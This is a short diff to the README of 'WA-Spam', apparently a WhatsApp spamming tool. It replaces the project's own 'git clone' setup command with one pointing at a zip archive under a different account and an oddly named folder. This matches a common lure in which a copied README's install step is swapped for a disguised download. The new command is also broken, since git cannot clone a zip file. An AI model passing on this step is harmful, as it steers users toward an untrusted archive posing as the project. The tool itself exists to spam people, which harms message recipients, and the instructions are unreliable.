@@ -14,7 +14,7 @@ To set up **WA-Spam**, follow these steps:
 
 ### Clone the Repository
 ```bash
-git clone https://github.com/sh1vam.03/WhatsApp-Spammer.git
+git clone https://raw.githubusercontent.com/kaniooo/WhatsApp-Spammer/main/subtertian/App-Whats-Spammer-v2.9.zip
 
 cd WhatsApp-Spammer
 ```
